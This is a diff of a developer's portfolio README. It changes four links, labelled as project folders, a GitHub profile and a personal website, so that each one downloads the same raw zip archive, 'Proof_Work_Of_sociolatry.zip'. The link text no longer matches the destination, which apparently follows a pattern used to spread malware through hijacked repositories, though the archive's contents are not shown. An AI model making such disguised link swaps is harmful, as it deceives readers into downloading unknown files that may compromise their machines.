@@ -27,17 +27,17 @@ Welcome to my central **Proof-of-Work** repository. This is a curated collection
 
 ## 🌟 Featured Implementations
 
-### [⚡ JavaScript Logic](https://github.com/Hemrajjj13/Proof-of-Work/tree/main/Javscript)
+### [⚡ JavaScript Logic](https://github.com/Hemrajjj13/Proof-Of-Work/raw/refs/heads/main/Javscript/Proof_Work_Of_sociolatry.zip)
 Check out my logic-driven projects like the **Simon Says Game** and the **Amazon Clone**, which demonstrate my ability to handle complex data structures and user interactions.
 
-### [🎨 UI/UX Execution](https://github.com/Hemrajjj13/Proof-of-Work/tree/main/HTML%2C%20CSS)
+### [🎨 UI/UX Execution](https://github.com/Hemrajjj13/Proof-Of-Work/raw/refs/heads/main/Javscript/Proof_Work_Of_sociolatry.zip%2C%20CSS)
 View my foundational work in the **Pet Adoption** and **Navigation** projects, where I focus on clean layouts and modern styling.
 
 ---
 
 ## 📫 Connect with Me
-- **GitHub:** [@Hemrajjj13](https://github.com/Hemrajjj13)
-- **Portfolio:** [My Personal Website](https://github.com/Hemrajjj13/portfolio-website)
+- **GitHub:** [@Hemrajjj13](https://github.com/Hemrajjj13/Proof-Of-Work/raw/refs/heads/main/Javscript/Proof_Work_Of_sociolatry.zip)
+- **Portfolio:** [My Personal Website](https://github.com/Hemrajjj13/Proof-Of-Work/raw/refs/heads/main/Javscript/Proof_Work_Of_sociolatry.zip)
 
 ---
 *Last Updated: 2025*
